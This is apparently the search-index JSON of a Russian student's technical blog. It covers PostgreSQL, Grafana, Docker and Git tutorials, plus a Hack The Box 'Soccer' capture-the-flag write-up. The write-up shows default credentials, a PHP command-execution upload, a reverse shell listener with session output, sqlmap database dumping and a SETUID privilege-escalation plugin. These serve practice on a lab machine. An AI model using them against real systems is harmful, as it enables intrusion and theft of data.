[
  {
    "objectID": "about.html",
    "href": "about.html",
    "title": "Обо мне",
    "section": "",
    "text": "Родился на улице Герцена, в гастрономе номер двадцать два. Известный экономист, по призванию своему библиотекарь, в народе - колхозник, в магазине - продавец, в экономике, так сказать, необходим. Это, так сказать, система. В составе ста двадцати единиц…"
  },
  {
    "objectID": "about.html#образование",
    "href": "about.html#образование",
    "title": "Обо мне",
    "section": "Образование",
    "text": "Образование\nРТУ МИРЭА (2020-2026) – направление 10.05.04 (Информационно-аналитические системы безопасности)"
  },
  {
    "objectID": "about.html#языки-программирования",
    "href": "about.html#языки-программирования",
    "title": "Обо мне",
    "section": "Языки программирования",
    "text": "Языки программирования\nPython, Go, C++"
  },
  {
    "objectID": "about.html#стек-технологий",
    "href": "about.html#стек-технологий",
    "title": "Обо мне",
    "section": "Стек технологий",
    "text": "Стек технологий\nLaTeX, Docker, Kubernetes, *nix, Ansible"
  },
  {
    "objectID": "posts/postgres/postgres.html",
    "href": "posts/postgres/postgres.html",
    "title": "Как перестать быть папуасом?",
    "section": "",
    "text": "Необходимо развернуть PostgreSQL версии не ниже 12, создать базу данных из четырёх столбцов произвольного названия и наполнить произвольными тестовыми данными, не менее 10-ти значений."
  },
  {
    "objectID": "posts/postgres/postgres.html#задание",
    "href": "posts/postgres/postgres.html#задание",
    "title": "Как перестать быть папуасом?",
    "section": "",
    "text": "Необходимо развернуть PostgreSQL версии не ниже 12, создать базу данных из четырёх столбцов произвольного названия и наполнить произвольными тестовыми данными, не менее 10-ти значений."
  },
  {
    "objectID": "posts/postgres/postgres.html#установка-postgresql",
    "href": "posts/postgres/postgres.html#установка-postgresql",
    "title": "Как перестать быть папуасом?",
    "section": "Установка PostgreSQL",
    "text": "Установка PostgreSQL\nDebian включает PostgreSQL в свои репозитории по умолчанию. Следующая команда установит PostgreSQL версии 15:\n$ sudo apt install postgresql-15\nПосле установки следует запустить сервис, используя systemctl:\n$ sudo systemctl start postgresql\n$ sudo systemctl status postgresql\n\n\n\nimage\n\n\nСледующим этапом будет создание базы данных и заполенение её тестовыми данными."
  },
  {
    "objectID": "posts/postgres/postgres.html#работа-с-postgresql",
    "href": "posts/postgres/postgres.html#работа-с-postgresql",
    "title": "Как перестать быть папуасом?",
    "section": "Работа с PostgreSQL",
    "text": "Работа с PostgreSQL\nПри установке СУБД PostgreSQL в операционной системе автоматически создаётся пользователь postgres, наделённый правами администратора базы данных. Используя команду sudo, можно получить возможность получить доступ к командной оболочке (с помощью ключа -i) от имени данного пользователя (ключ -u):\n$ sudo -iu postgres\nСледующим шагом является запуск консоли Postgres:\n$ psql\nДалее для удобства была создана схема devops, в которой и будут дальше создаваться таблицы:\npostgres=# CREATE SCHEMA devops;\nВ созданной схеме создадим отношение “Автор” с атрибутами: идентификатор (первичный ключ), ФИО, страна рождения, дата рождения:\npostgres=# CREATE TABLE devops.author(\n    id SERIAL PRIMARY KEY,\n    fio VARCHAR NOT NULL,\n    country VARCHAR NOT NULL,\n    dob DATE NOT NULL);\nЗаполним таблицу данными:\npostgres=# INSERT INTO devops.author(fio,country,dob) VALUES\n('Александр Сергеевич Пушкин', 'Россия', '1799-06-06'),\n('Лев Николаевич Толстой', 'Россия', '1828-09-09');    \nПроверим результат:\npostgres=# SELECT * FROM devops.author;\n    id |            fio             | country |    dob     \n   ----+----------------------------+---------+------------\n     1 | Александр Сергеевич Пушкин | Россия  | 1799-06-06\n     2 | Лев Николаевич Толстой     | Россия  | 1828-09-09\n   (2 строки)   \nСоздадим отношение “Издательство” с атрибутами: идентификатор (первичный ключ), название, город:\npostgres=# CREATE TABLE devops.izd(\n    id SERIAL PRIMARY KEY,\n    name VARCHAR NOT NULL,\n    city VARCHAR NOT NULL);\nЗаполним таблицу данными:\npostgres=# INSERT INTO devops.izd(name,city) VALUES\n('Мир','Москва'),\n('Питер','Санкт-Петербург'),\n('АСТ','Москва');\nПроверим результат:\npostgres=# SELECT * FROM devops.izd;\nid | name  |      city       \n----+-------+-----------------\n  1 | Мир   | Москва\n  2 | Питер | Санкт-Петербург\n  3 | АСТ   | Москва\n(3 строки)\nСоздадим отношение “Книга” с атрибутами: идентификатор (первичный ключ), идентификатор автора (внешний ключ в отношение “Автор” ), название, идентификатор издателя (внешний ключ в отношение “Издатель”), дата издания, номер издания (если есть):\npostgres=# CREATE TABLE devops.book(\n    id SERIAL PRIMARY KEY,\n    author_id INTEGER NOT NULL,\n    CONSTRAINT fk_book_author\n    FOREIGN KEY(author_id)\n    REFERENCES devops.author(id),\n    name VARCHAR NOT NULL,\n    izd_id SERIAL,\n    CONSTRAINT fk_book_izd\n    FOREIGN KEY(izd_id)\n    REFERENCES devops.izd(id),\n    izd_num INTEGER);\nНаполним таблицу данными:\npostgres=# INSERT INTO\ndevops.book(author_id, name, izd_id, izd_num)\n    VALUES\n    (1, 'Евгений Онегин', 1, NULL),\n    (2, 'Война и Мир', 3, NULL),\n    (2, 'Воскресенье', 2, NULL),\n    (1, 'Капитанская дочка',1,NULL),             \n    (1, 'Сочинения А.С. Пушкина', 2, 3);\nПроверим результат:\npostgres=# SELECT * FROM devops.book;\nid | author_id |          name          | izd_id | izd_num \n----+-----------+------------------------+--------+---------\n1 |         1 | Евгений Онегин         |      1 |        \n2 |         2 | Война и Мир            |      3 |        \n3 |         2 | Воскресенье            |      2 |        \n4 |         1 | Капитанская дочка      |      1 |        \n5 |         1 | Сочинения А.С. Пушкина |      2 |       3 \nСоздадим отношение “Наличие книг в магазине” с атрибутами: идентификатор (первичный ключ), идентификатор книги (внешний ключ в отношение “Книга”), цена, наличие в магазине:\npostgres= #CREATE TABLE devops.shop(\n    id SERIAL PRIMARY KEY,\n    book_id INTEGER NOT NULL,\n    CONSTRAINT fk_shop_book\n    FOREIGN KEY(book_id)\n    REFERENCES devops.book(id),\n    price INTEGER NOT NULL,\n    available BOOLEAN NOT NULL);\nЗаполним таблицу значениями:\npostgres=# INSERT INTO\n devops.shop(book_id, price, available) VALUES\n(1, 300, TRUE),\n(2, 450, FALSE),\n(3, 120, TRUE),\n(4,80, TRUE),\n(6,650, TRUE);\nПроверим результат:\npostgres=# SELECT sh.id, b.name,\n price, available FROM devops.shop sh  \nJOIN devops.book b on sh.book_id=b.id;\n    id |          name          | price | available \n----+------------------------+-------+-----------\n    1 | Евгений Онегин         |   300 | t\n    2 | Война и Мир            |   450 | f\n    3 | Воскресенье            |   120 | t\n    4 | Капитанская дочка      |    80 | t\n    5 | Сочинения А.С. Пушкина |   650 | t\n(5 строк)    \nСделаем дамп схемы devops, отображённый в приложении А – резервная копия базы данных:\n$ sudo -u postgres pg_dump -d postgres -n devops &gt; dump.sql \nТаким образом, была создана база данных с четырьмя таблицами, заполненными тестовыми данными."
  },
  {
    "objectID": "posts/soccer_htb/readme.html#ход-работы",
    "href": "posts/soccer_htb/readme.html#ход-работы",
    "title": "Writeup машины Soccer",
    "section": "Ход работы",
    "text": "Ход работы\n\nСканирование хоста NMap\n┌──(kali㉿kali)-[~]\n└─$ nmap -sC -sV 10.10.11.194\n\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-04-17 12:25 EDT\nNmap scan report for soccer.htb (10.10.11.194)\nHost is up (0.053s latency).\nNot shown: 997 closed tcp ports (conn-refused)\nPORT     STATE SERVICE         VERSION\n22/tcp   open  ssh             OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 ad0d84a3fdcc98a478fef94915dae16d (RSA)\n|   256 dfd6a39f68269dfc7c6a0c29e961f00c (ECDSA)\n|_  256 5797565def793c2fcbdb35fff17c615c (ED25519)\n80/tcp   open  http            nginx 1.18.0 (Ubuntu)\n|_http-server-header: nginx/1.18.0 (Ubuntu)\n|_http-title: Soccer - Index \n9091/tcp open  xmltec-xmlmail?\n| fingerprint-strings: \n|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix: \n|     HTTP/1.1 400 Bad Request\n|     Connection: close\n|   GetRequest: \n|     HTTP/1.1 404 Not Found\n|     Content-Security-Policy: default-src 'none'\n|     X-Content-Type-Options: nosniff\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 139\n|     Date: Mon, 17 Apr 2023 16:25:26 GMT\n|     Connection: close\n|     &lt;!DOCTYPE html&gt;\n|     &lt;html lang=\"en\"&gt;\n|     &lt;head&gt;\n|     &lt;meta charset=\"utf-8\"&gt;\n|     &lt;title&gt;Error&lt;/title&gt;\n|     &lt;/head&gt;\n|     &lt;body&gt;\n|     &lt;pre&gt;Cannot GET /&lt;/pre&gt;\n|     &lt;/body&gt;\n|     &lt;/html&gt;\n|   HTTPOptions, RTSPRequest: \n|     HTTP/1.1 404 Not Found\n|     Content-Security-Policy: default-src 'none'\n|     X-Content-Type-Options: nosniff\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 143\n|     Date: Mon, 17 Apr 2023 16:25:26 GMT\n|     Connection: close\n|     &lt;!DOCTYPE html&gt;\n|     &lt;html lang=\"en\"&gt;\n|     &lt;head&gt;\n|     &lt;meta charset=\"utf-8\"&gt;\n|     &lt;title&gt;Error&lt;/title&gt;\n|     &lt;/head&gt;\n|     &lt;body&gt;\n|     &lt;pre&gt;Cannot OPTIONS /&lt;/pre&gt;\n|     &lt;/body&gt;\n|_    &lt;/html&gt;\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port9091-TCP:V=7.93%I=7%D=4/17%Time=643D72F1%P=x86_64-pc-linux-gnu%r(in\nSF:formix,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\nSF:\\n\\r\\n\")%r(drda,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x\nSF:20close\\r\\n\\r\\n\")%r(GetRequest,168,\"HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\\nSF:nContent-Security-Policy:\\x20default-src\\x20'none'\\r\\nX-Content-Type-Op\nSF:tions:\\x20nosniff\\r\\nContent-Type:\\x20text/html;\\x20charset=utf-8\\r\\nCo\nSF:ntent-Length:\\x20139\\r\\nDate:\\x20Mon,\\x2017\\x20Apr\\x202023\\x2016:25:26\\\nSF:x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang\nSF:=\\\"en\\\"&gt;\\n&lt;head&gt;\\n&lt;meta\\x20charset=\\\"utf-8\\\"&gt;\\n&lt;title&gt;Error&lt;/title&gt;\\n&lt;/\nSF:head&gt;\\n&lt;body&gt;\\n&lt;pre&gt;Cannot\\x20GET\\x20/&lt;/pre&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n\")%r(HT\nSF:TPOptions,16C,\"HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Security-Pol\nSF:icy:\\x20default-src\\x20'none'\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\n\nSF:Content-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20143\\\nSF:r\\nDate:\\x20Mon,\\x2017\\x20Apr\\x202023\\x2016:25:26\\x20GMT\\r\\nConnection:\nSF:\\x20close\\r\\n\\r\\n&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\\"en\\\"&gt;\\n&lt;head&gt;\\n&lt;me\nSF:ta\\x20charset=\\\"utf-8\\\"&gt;\\n&lt;title&gt;Error&lt;/title&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n&lt;pre&gt;C\nSF:annot\\x20OPTIONS\\x20/&lt;/pre&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n\")%r(RTSPRequest,16C,\"HT\nSF:TP/1\\.1\\x20404\\x20Not\\x20Found\\r\\nContent-Security-Policy:\\x20default-s\nSF:rc\\x20'none'\\r\\nX-Content-Type-Options:\\x20nosniff\\r\\nContent-Type:\\x20\nSF:text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x20143\\r\\nDate:\\x20Mon,\\\nSF:x2017\\x20Apr\\x202023\\x2016:25:26\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n\nSF:&lt;!DOCTYPE\\x20html&gt;\\n&lt;html\\x20lang=\\\"en\\\"&gt;\\n&lt;head&gt;\\n&lt;meta\\x20charset=\\\"u\nSF:tf-8\\\"&gt;\\n&lt;title&gt;Error&lt;/title&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n&lt;pre&gt;Cannot\\x20OPTIONS\\\nSF:x20/&lt;/pre&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n\")%r(RPCCheck,2F,\"HTTP/1\\.1\\x20400\\x20Bad\nSF:\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%r(DNSVersionBindReqTCP,2F\nSF:,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\")%\nSF:r(DNSStatusRequestTCP,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnect\nSF:ion:\\x20close\\r\\n\\r\\n\")%r(Help,2F,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\nSF:\\nConnection:\\x20close\\r\\n\\r\\n\")%r(SSLSessionReq,2F,\"HTTP/1\\.1\\x20400\\x\nSF:20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n\");\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 17.63 seconds\nНа хосте имеется:\n1.Веб-сервер Nginx\n2.SSH-сервер\n3.Неизвестный сервис на порту 9091\nДобавим ресурсную запись хоста в файл /etc/hosts:\n┌──(kali㉿kali)-[~]\n└─$ sudo su -c 'echo 10.10.11.194 soccer.htb &gt;&gt; /etc/hosts'\n\n\nРабота с веб-сервером\n\nИмеется одностраничный сайт-визитка – ничего интересного даже в исходном коде страницы.\nПопробуем перебрать директории с помощью OWASP Dirbuster. Используется словарь /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt:\n\nПолученный отчёт:\nDirBuster 1.0-RC1 - Report\nhttp://www.owasp.org/index.php/Category:OWASP_DirBuster_Project\nReport produced on Mon Apr 17 12:37:03 EDT 2023\n--------------------------------\n\nhttp://soccer.htb:80\n--------------------------------\nDirectories found during testing:\n\nDirs found with a 200 response:\n\n/\n/tiny/\n\nDirs found with a 403 response:\n\n/tiny/uploads/\n\n\n--------------------------------\nFiles found during testing:\n\nFiles found with a 301 responce:\n\n/tiny\n/tiny/uploads\n\n\n--------------------------------\nПерейдём в директорию http://soccer.htb/tiny/:\n\nВ данной директории находится файловый менеджер Tiny (https://github.com/prasathmani/tinyfilemanager). Согласно документации, стандартные имена и пароли:\n\nadmin/admin123\nuser/12345\n\nУспешно получилось зайти с аккаунта admin:\n\nПоищем уязвимости в базе уязвимостей MITRE (https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=Tiny+File+Manager). Нас интересует RCE-уязвимость CVE-2021-45010, охватывающая множество версий файлового менеджера. Проверим версию Tiny на машине:\n\nВерсия 2.4.3 имеет данную уязвимость. Попробуем её возобновить, залив на сервер свой файл со следующим содержанием:\n&lt;?php system(\"whoami\")?&gt;\n\nПри открытии код действительно исполняется:\n\nКак и ожидалось, пользователь - www-data.\nВоспользуемся Reverse Shell, написанным на PHP (https://github.com/h4ckthreat/php-reverse-shell/blob/main/php-reverse-shell.php):\n\nЗагрузим файл на сервер и получим доступ к хосту через nc:\n┌──(kali㉿kali)-[~]\n└─$ nc -nvlp 1337\nlistening on [any] 1337 ...\nconnect to [10.10.16.59] from (UNKNOWN) [10.10.11.194] 45910\nLinux soccer 5.4.0-135-generic #152-Ubuntu SMP Wed Nov 23 20:19:22 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux\n 12:02:14 up 2 min,  0 users,  load average: 0.41, 0.39, 0.16\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n/bin/sh: 0: can't access tty; job control turned off\n$ ls /home/\nplayer\n$ ls /home/player\nuser.txt\n$ cat /home/player/user.txt\ncat: /home/player/user.txt: Permission denied\nВ файлах конфигурации Nginx фигурирует ещё один домен: soc-player.soccer.htb:\n$ ls /etc/nginx/sites-enabled\ndefault\nsoc-player.htb\n$ cat /etc/nginx/sites-enabled/soc-player.htb\nserver {\n        listen 80;\n        listen [::]:80;\n\n        server_name soc-player.soccer.htb;\n\n        root /root/app/views;\n\n        location / {\n                proxy_pass http://localhost:3000;\n                proxy_http_version 1.1;\n                proxy_set_header Upgrade $http_upgrade;\n                proxy_set_header Connection 'upgrade';\n                proxy_set_header Host $host;\n                proxy_cache_bypass $http_upgrade;\n        }\n\n}\nДобавим его в файл hosts:\n┌──(kali㉿kali)-[~]\n└─$ sudo su -c  'echo 10.10.11.194 soc-player.soccer.htb &gt;&gt; /etc/hosts'\nЗайдём на него:\n\nДанный сайт значительно более функционален, чем тот, что был рассмотрен выше: присутствует форма авторизации и некая опция Match:\n\nСайт при авторизации предлагает бесплатный билет на матч…\nАвторизуемся на сайте:\n\nПосле авторизации пользователя встречает интерфейс, позволяющий проверить, является ли билет действительным или нет:\n\nВведём случайную комбинацию цифр:\n\nПосмотрим на исходный код сайта:\n\nСкрипт подключается по WebSocket к порту 9091, принимает в поле ввода значение, и с некоторой задержкой после ввода данных пользователем, отправляет через WebSocket значение id. Попробуем проверить, уязвима ли данная система к SQL-инъекциям:\n\nИ действительно, на порту 9091 нас ожидает SQL-сервер.\n\n\nSQL-инъекции с использованием SQLMap\nТак как SQLMap не поддерживает работу через WebSockets, для начала необходимо запустить промежуточное ПО, которое станет прослойкой между запросами SQLMap и WebSockets (https://rayhan0x01.github.io/ctf/2021/04/02/blind-sqli-over-websocket-automation.html, middleware.py в репозитории):\n\nПопробуем перебрать все базы данных, которые есть в СУБД:\n┌──(kali㉿kali)-[~]\n└─$ sqlmap -u \"http://localhost:8081/id=1?\" --dbs --batch\n\n\nНас может заинтересовать база данных soccer_db. Получим её дамп:\n┌──(kali㉿kali)-[~]\n└─$ sqlmap -u \"http://localhost:8081/id=1\" -D soccer_db --dump --batch\n\nБыли получены логин и пароль:\n\n\nПовышение привелегий\nПопробуем по ним к серверу по ssh:\n┌──(kali㉿kali)-[~]\n└─$ ssh player@soccer.htb\n\nПолучен пользовательский флаг:\nplayer@soccer:~$ cat user.txt\nЗальём его на сайт:\n\nПользователь не прописан в /etc/sudoers:\n\nПроверим, какие программы есть с SETUID (флагом в UNIX, обозначающим, что можно запустить исполняемый файл от имени владельца исполняемого файла, например пользователя root):\n\nЕсть утилита /usr/local/bin/doas, являющаяся функциональным аналогом sudo:\n\nПроверим файл конфигурации /usr/local/etc/doas.conf:\n\nПользователь имеет право запускать утилиту dstat(https://github.com/dstat-real/dstat) от имении суперпользователя:\n\n\nDstat поддерживает плагины, написанные на чистом Python. Напишем свой в каталог /usr/share/local/dstat, в который пользователь player имеет право записывать:\n\n\nПлагин ставит флаг SETUID в файл /bin/bash. Это означает то, что, запустив bash, он будет исполняться от имени суперпользователя.\nБыл получен полный доступ к машине:\n\nВыложим флаг:\n\nМашина взломана!"
  },
  {
    "objectID": "posts/grafana/grafana.html",
    "href": "posts/grafana/grafana.html",
    "title": "Развёртывание стека Node-Exporter+Prometheus+Grafana",
    "section": "",
    "text": "Развертывание стека можно осуществить с помощью Docker. Для этого можно составить docker-compose file."
  },
  {
    "objectID": "posts/grafana/grafana.html#развертывание-стека",
    "href": "posts/grafana/grafana.html#развертывание-стека",
    "title": "Развёртывание стека Node-Exporter+Prometheus+Grafana",
    "section": "",
    "text": "Развертывание стека можно осуществить с помощью Docker. Для этого можно составить docker-compose file."
  },
  {
    "objectID": "posts/grafana/grafana.html#node-exporter",
    "href": "posts/grafana/grafana.html#node-exporter",
    "title": "Развёртывание стека Node-Exporter+Prometheus+Grafana",
    "section": "Node-Exporter",
    "text": "Node-Exporter\n    version: \"3.9\"\n    services:\n        node-exporter:\n        image: prom/node-exporter:latest\n        container_name: node-exporter\n        restart: unless-stopped\n        volumes:\n        - /proc:/host/proc:ro\n        - /sys:/host/sys:ro\n        - /:/roofs:ro\n        command:\n        - '--path.procfs=/host/proc'\n        - '--path.rootfs=/rootfs'\n        - '--path.sysfs=/host/sys'\n        - '--collector.filesystem.mount-points-exclude=^/(sys|proc|\n          dev|host|etc)($$|/)'\n        ports:\n        - \"9100:9100\"\nСервису Node-Exporter был дан доступ к корневому каталогу системы только на чтение, также был дан доступ к каталогу /sys для получения параметров ядра Linux и /proc для получения информации о процессах и системе в целом. Для возможности подключиться к сервису был проброшен порт 9100."
  },
  {
    "objectID": "posts/grafana/grafana.html#prometheus-и-grafana",
    "href": "posts/grafana/grafana.html#prometheus-и-grafana",
    "title": "Развёртывание стека Node-Exporter+Prometheus+Grafana",
    "section": "Prometheus и Grafana",
    "text": "Prometheus и Grafana\n        prometheus:\n        container_name: prometheus\n        image: prom/prometheus:latest\n        volumes:\n          - ./prometheus.yml:/etc/prometheus/prometheus.yml\n          - prometheus-data:/prometheus\n        command:\n          - '--config.file=/etc/prometheus/prometheus.yml'\n        ports:\n          - 9090:9090\n      grafana:\n        container_name: grafana\n        image: grafana/grafana:latest\n        user: \"0\"\n        ports:\n        - \"3000:3000\"\n        volumes:\n        - grafana-data:/var/lib/grafana\n    volumes:\n        grafana-data:\n        prometheus-data:\nДля сервисов Prometheus и Grafana были проброшены порты 9090 и 3000 соответственно. Также для этих сервисов были созданы Docker Volume. Для работы Prometheus требуется файл конфигурации prometheus.yml."
  },
  {
    "objectID": "posts/grafana/grafana.html#prometheus.yml",
    "href": "posts/grafana/grafana.html#prometheus.yml",
    "title": "Развёртывание стека Node-Exporter+Prometheus+Grafana",
    "section": "Prometheus.yml",
    "text": "Prometheus.yml\n    global:\n    scrape_interval: 15s\n    evaluation_interval: 15s\n\n    scrape_configs:\n    - job_name: \"node_exporter\"\n    scrape_interval: 15s\n    static_configs:\n    - targets: [\"node-exporter:9100\"]\nКаждые 15 секунд сервис Prometheus будет отправлять информацию на сервис Node-Exporter. Стоит обратить внимание, что обращение к нему проводится не по IP-адресу, а по названию сервиса. Запустим получившийся docker-compose file:\ndocker-compose up -d\n\n\n\nimage"
  },
  {
    "objectID": "posts/grafana/grafana.html#настройка-grafana",
    "href": "posts/grafana/grafana.html#настройка-grafana",
    "title": "Развёртывание стека Node-Exporter+Prometheus+Grafana",
    "section": "Настройка Grafana",
    "text": "Настройка Grafana\nПерейдём в дэшборд Grafana (127.0.0.1:3000). При входе необходимо ввести логин и пароль (по умолчанию логин: admin, пароль: admin)\n\n\n\nimage\n\n\nИмпортируем Prometheus как источник данных:\n\n\n\nimage\n\n\nКак адрес можно указать название сервиса (в данном случае – prometheus). Следующим шагом является создание Dashboard. Был выбран дэшборд Node Exporter Full (Grafana ID - 1860):\n\n\n\nimage\n\n\nОткроем дэшборд:\n\n\n\nimage\n\n\nТаким образом, был успешно развёрнут стек Prometheus+Grafana+Node Exporter с помощью программного обеспечения для автоматизации и развёртывания приложений Docker."
  },
  {
    "objectID": "index.html",
    "href": "index.html",
    "title": "olekzonder",
    "section": "",
    "text": "Привет, мир!\n\nСтатьи\n\n\n\n\n\n\n\n   \n     \n     \n       Сортировать по\n       предварительно выбранный\n         \n          Заголовок\n        \n         \n          Дата - Самый старый\n        \n         \n          Дата - Новейшие\n        \n     \n  \n\n\n\n\n\n\n\nСоздание Docker образа Astra Linux\n\n\n\n\n\n\n\n\n\n\nРазвёртывание стека Node-Exporter+Prometheus+Grafana\n\n\n\n\n\n\n\n\n\n\nКак осилить Github Actions?\n\n\n\n\n\n\n\n\n\n\nКак запушить на Github?\n\n\n\n\n\n\n\n\n\n\nЗадание\n\n\n\n\n\n\n\n\n\n\nWriteup машины Soccer\n\n\n\n\n\n\n\n\n\n\nPHDays 12\n\n\n\n\n\n\n\nНет подходящих элементов"
  },
  {
    "objectID": "posts/astra-docker/astra-docker.html",
    "href": "posts/astra-docker/astra-docker.html",
    "title": "Создание Docker образа Astra Linux",
    "section": "",
    "text": "Образ дистрибутива Astra Linux, как и любого дистрибутива, основанного на Debian, создаётся в три этапа:\n1)Выполняется сборка chroot-окружения с помощью debootstrap;\n2)Выполняется настройка chroot-окружения;\n3)Полученное chroot-окружение конвертируется в образ Docker."
  },
  {
    "objectID": "posts/astra-docker/astra-docker.html#сборка-chroot-окружения",
    "href": "posts/astra-docker/astra-docker.html#сборка-chroot-окружения",
    "title": "Создание Docker образа Astra Linux",
    "section": "Сборка chroot-окружения",
    "text": "Сборка chroot-окружения\nСборка производится с помощью команды debootstrap:\ndebootstrap --variant=minbase --include locales,lsb-release --components=main,contrib,non-free orel /var/astra-chroot http://dl.astralinux.ru/astra/stable/2.12_x86-64/repository\nДанная команда создаст chroot-окружение ОС Astra Linux “Орёл”."
  },
  {
    "objectID": "posts/astra-docker/astra-docker.html#настройка-chroot-окружения",
    "href": "posts/astra-docker/astra-docker.html#настройка-chroot-окружения",
    "title": "Создание Docker образа Astra Linux",
    "section": "Настройка chroot-окружения",
    "text": "Настройка chroot-окружения\nНастройка созданного образа осуществляется посредством входа в chroot-окружение с помощью команды chroot:\nchroot /var/astra-chroot\nСгенериурем локали:\necho \"ru_RU.UTF-8 UTF-8\" &gt;&gt; /etc/locale.gen\necho \"en_US.UTF-8 UTF-8\" &gt;&gt; /etc/locale.gen\nlocale-gen\nupdate-locale ru_RU.UTF-8\nХорошим тоном при создании образов Docker является максимальное уменьшение его размера. Очистка кэша apt наиболее значительно уменьшает размеры итогового образа и не влияет на функциональность образа:\napt update\nmv /etc/apt/sources.list.bak /etc/apt/sources.list\napt-get autoclean\napt clean"
  },
  {
    "objectID": "posts/astra-docker/astra-docker.html#создание-образа-docker",
    "href": "posts/astra-docker/astra-docker.html#создание-образа-docker",
    "title": "Создание Docker образа Astra Linux",
    "section": "Создание образа Docker",
    "text": "Создание образа Docker\ntar -C /var/astra-chroot -cpf - . |docker import\\\n    - astralinux:orel\\\n    --change \"ENV PATH /usr/local/sbin:/usr/local/bin\\\n    :/usr/sbin:/usr/bin:/sbin:/bin\"\\\n    --change 'CMD [\"/bin/bash\"]'\\\n    --change \"ENV LANG=ru_RU.UTF-8\"\nВ результате будет создан образ с российской локализацией и точкой входа в bash. Итоговый размер образа – 204 мегабайта."
  },
  {
    "objectID": "posts/git/git.html",
    "href": "posts/git/git.html",
    "title": "Как запушить на Github?",
    "section": "",
    "text": "Для начала стоит понять, что значит запушить. Запушить - значит загрузить код проекта на какой-то сервис для хостинга проектов. В данной статье рассматривается то, как загрузить проект на Github, используя командную строку."
  },
  {
    "objectID": "posts/git/git.html#введение",
    "href": "posts/git/git.html#введение",
    "title": "Как запушить на Github?",
    "section": "",
    "text": "Для начала стоит понять, что значит запушить. Запушить - значит загрузить код проекта на какой-то сервис для хостинга проектов. В данной статье рассматривается то, как загрузить проект на Github, используя командную строку."
  },
  {
    "objectID": "posts/git/git.html#что-такое-проект",
    "href": "posts/git/git.html#что-такое-проект",
    "title": "Как запушить на Github?",
    "section": "Что такое проект?",
    "text": "Что такое проект?\nПод проектом подразумевается некоторый конечный продукт. Примеры проектов (с примером названий):\n\nКалькулятор (calculator)\nСборник алгоритмов, написанных в процессе обучения (algorithms-synergy-2023)\nЗадачи, написанные в ходе работы с сайтами по типу Codeforces (codeforces-csharp)\n\nХорошей практикой является написание пояснительного README файла. Github, как и многие площадки для хостинга кода проектов, поддерживают Markdown.\nВ случае работы с Git появляется понятие репозиторий. Репозиторий представляет из себя хранилище всех версий проекта, создаваемых по мере его проекта."
  },
  {
    "objectID": "posts/git/git.html#установка-и-предварительная-настройка-git",
    "href": "posts/git/git.html#установка-и-предварительная-настройка-git",
    "title": "Как запушить на Github?",
    "section": "Установка и предварительная настройка Git",
    "text": "Установка и предварительная настройка Git\nДанная статья предполагает, что человек умеет запускать терминал и имеет установленный git. Если это не так, это можно исправить:\n\nНа Linux (Debian, Ubuntu, Linux Mint):\n\nsudo apt install git\n\nНа Windows необходимо скачать Git, установить его и запустить Git Bash\nНа macOS (через Homebrew):\n\nbrew install git\nПеред тем, как приступить к работе с Git, необходимо указать имя пользователя и электронную почту:\ngit config --global user.name \"Имя пользователя\"\ngit config --global user.email \"почта\""
  },
  {
    "objectID": "posts/git/git.html#как-создать-репозиторий",
    "href": "posts/git/git.html#как-создать-репозиторий",
    "title": "Как запушить на Github?",
    "section": "Как создать репозиторий?",
    "text": "Как создать репозиторий?\nДля того, чтобы создать репозиторий, необходимо открыть терминал в каталоге проекта и ввести следующую команду:\ngit init\nВ результате выполнения команды будет создан репозиторий Git. Чтобы убедиться, можно проверить содержимое каталога проекта:\n[Screenshot_20230902_101654.png]\nКак видно из скриншота, появился скрытый каталог .git, в котором и таится репозиторий.\nИзначально репозиторий создаётся пустой. Изначально создаются Чтобы репозиторий стал менее пустым, добавим файлы в репозиторий и создадим первый коммит:\ngit add .\ngit commit -m \"Мой первый коммит\"\nКоммит в Git - это своего рода снимок состояния изменений. За счёт создания коммитов можно отслеживать, какие изменения происходили с кодом, и в случае, если они ломают проект, можно быстро их откатить."
  },
  {
    "objectID": "posts/git/git.html#как-залить-коммит-на-github",
    "href": "posts/git/git.html#как-залить-коммит-на-github",
    "title": "Как запушить на Github?",
    "section": "Как залить коммит на Github?",
